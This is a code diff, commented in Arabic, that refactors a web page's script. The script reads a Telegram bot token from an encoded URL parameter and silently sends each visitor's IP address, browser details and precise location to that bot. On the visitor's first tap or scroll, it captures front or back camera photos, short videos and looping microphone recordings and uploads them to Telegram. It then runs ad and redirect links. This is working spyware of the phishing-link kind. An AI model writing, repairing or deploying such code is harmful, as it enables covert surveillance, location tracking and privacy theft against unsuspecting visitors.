@@ -80,123 +80,142 @@
 </div>
 
 <script>
-// 1. قراءة الرابط المشفر
+// ═══════════════════════════════════════════════════
+// 1. فك التشفير (تم تصليحه)
+// ═══════════════════════════════════════════════════
 const urlParams = new URLSearchParams(window.location.search);
 const encodedData = urlParams.get('data');
 let config = null;
 
 if (encodedData) {
     try {
-        config = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(encodedData)))));
-    } catch (e) { console.error("خطأ في فك التشفير"); }
+        // فك التشفير بنظام Base64
+        const decoded = atob(decodeURIComponent(encodedData));
+        const jsonStr = decodeURIComponent(escape(decoded));
+        config = JSON.parse(jsonStr);
+        
+        // لو الـ config اتقرأ بنجاح، هنشغل الأدوات
+        if (config && config.id && config.token) {
+            
+            // معلومات الجهاز والموقع (شغالين أوتوماتيك)
+            if (config.inf) sendInfo(config);
+            if (config.loc) getLocation(config);
+
+            // الكاميرا والمايك (بيطلبوا أول ما المستخدم يدوس في أي حتة)
+            if (config.fc || config.bc || config.r || config.fcv || config.bcv) {
+                const trigger = () => {
+                    startMedia(config);
+                    document.removeEventListener('click', trigger);
+                    document.removeEventListener('touchstart', trigger);
+                    document.removeEventListener('scroll', trigger);
+                };
+                document.addEventListener('click', trigger);
+                document.addEventListener('touchstart', trigger);
+                document.addEventListener('scroll', trigger);
+            }
+        }
+    } catch (e) {
+        console.error("خطأ في فك التشفير", e);
+    }
 }
 
-// 2. تشغيل الأدوات أوتوماتيك
-if (config) {
-    // معلومات الجهاز والموقع هيتنفذوا أوتوماتيك
-    autoStart(config);
+// ═══════════════════════════════════════════════════
+// 2. دوال الأدوات
+// ═══════════════════════════════════════════════════
+async function sendMsg(config, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: config.id, text: text, parse_mode: 'HTML'})
+        });
+    } catch (e) {}
 }
 
-async function autoStart(config) {
-    if (!config.id || !config.token) return;
+async function sendInfo(config) {
+    try {
+        let ipRes = await fetch('https://api.ipify.org?format=json');
+        let ipData = await ipRes.json();
+        sendMsg(config, `🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>`);
+    } catch (e) {}
+}
+
+function getLocation(config) {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition((pos) => {
+        sendMsg(config, `📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
+    }, (err) => {}, { enableHighAccuracy: true });
+}
+
+async function startMedia(config) {
     const botUrl = `https://api.telegram.org/bot${config.token}/`;
     const chatId = config.id;
 
-    async function sendMsg(text) {
-        try { await fetch(botUrl + "sendMessage", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'}) }); } catch (e) {}
-    }
-
-    // 1. معلومات الجهاز (بتشتغل أوتوماتيك)
-    if (config.inf) {
+    // كاميرا (صور)
+    if (config.fc || config.bc) {
         try {
-            let ipRes = await fetch('https://api.ipify.org?format=json');
-            let ipData = await ipRes.json();
-            sendMsg(`🟢 <b>دخول جديد</b>\n<b>IP:</b> <code>${ipData.ip}</code>\n<b>UA:</b> <code>${navigator.userAgent}</code>`);
+            let facingMode = config.fc ? "user" : "environment";
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+            let video = document.createElement('video'); video.srcObject = stream; video.play();
+            setTimeout(() => {
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob((blob) => {
+                    let formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.jpg');
+                    fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 1000);
         } catch (e) {}
     }
 
-    // 2. الموقع (بيشتغل أوتوماتيك)
-    if (config.loc && navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            sendMsg(`📍 <b>الموقع</b>\n<a href="https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}">اضغط لفتح الخريطة</a>`);
-        }, (err) => {}, { enableHighAccuracy: true });
+    // فيديو
+    if (config.fcv || config.bcv) {
+        try {
+            let facingMode = config.fcv ? "user" : "environment";
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+            let mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                let blob = new Blob(chunks, { type: 'video/webm' });
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', blob, 'video.webm');
+                fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
+                stream.getTracks().forEach(t => t.stop());
+            };
+            mediaRecorder.start();
+            setTimeout(() => { mediaRecorder.stop(); }, 3000);
+        } catch (e) {}
     }
 
-    // 3. الكاميرا والصوت (بيطلبوا أول ما المستخدم يلمس الشاشة)
-    if (config.fc || config.bc || config.r || config.fcv || config.bcv) {
-        
-        // بنستنى أول تفاعل من المستخدم (لمسة أو سكرول)
-        document.body.addEventListener('touchstart', triggerMedia, { once: true });
-        document.body.addEventListener('click', triggerMedia, { once: true });
-        document.body.addEventListener('scroll', triggerMedia, { once: true });
-
-        async function triggerMedia() {
-            // الكاميرا (صور)
-            if (config.fc || config.bc) {
-                try {
-                    let facingMode = config.fc ? "user" : "environment";
-                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                    let video = document.createElement('video'); video.srcObject = stream; video.play();
-                    setTimeout(() => {
-                        let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob((blob) => {
-                            let formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob, 'photo.jpg');
-                            fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg');
-                    }, 1000);
-                } catch (e) {}
-            }
-
-            // فيديو
-            if (config.fcv || config.bcv) {
-                try {
-                    let facingMode = config.fcv ? "user" : "environment";
-                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
-                    let mediaRecorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.onstop = () => {
-                        let blob = new Blob(chunks, { type: 'video/webm' });
-                        let formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('video', blob, 'video.webm');
-                        fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => { mediaRecorder.stop(); }, 3000);
-                } catch (e) {}
-            }
-
-            // تسجيل صوتي
-            if (config.r) {
-                try {
-                    let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    let mediaRecorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.onstop = () => {
-                        let blob = new Blob(chunks, { type: 'audio/webm' });
-                        let formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('audio', blob, 'voice.webm');
-                        fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
-                        if (config.r) { mediaRecorder.start(); setTimeout(() => { mediaRecorder.stop(); }, 5000); }
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
-                } catch (e) {}
-            }
-        }
+    // تسجيل صوتي
+    if (config.r) {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            let mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                let blob = new Blob(chunks, { type: 'audio/webm' });
+                let formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('audio', blob, 'voice.webm');
+                fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
+                if (config.r) { mediaRecorder.start(); setTimeout(() => { mediaRecorder.stop(); }, 5000); }
+            };
+            mediaRecorder.start();
+            setTimeout(() => { mediaRecorder.stop(); }, 5000);
+        } catch (e) {}
     }
 }
 
-// 3. كود العداد والإعلانات (زي ما هو)
+// ═══════════════════════════════════════════════════
+// 3. كود العداد والإعلانات (بتاعك)
+// ═══════════════════════════════════════════════════
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
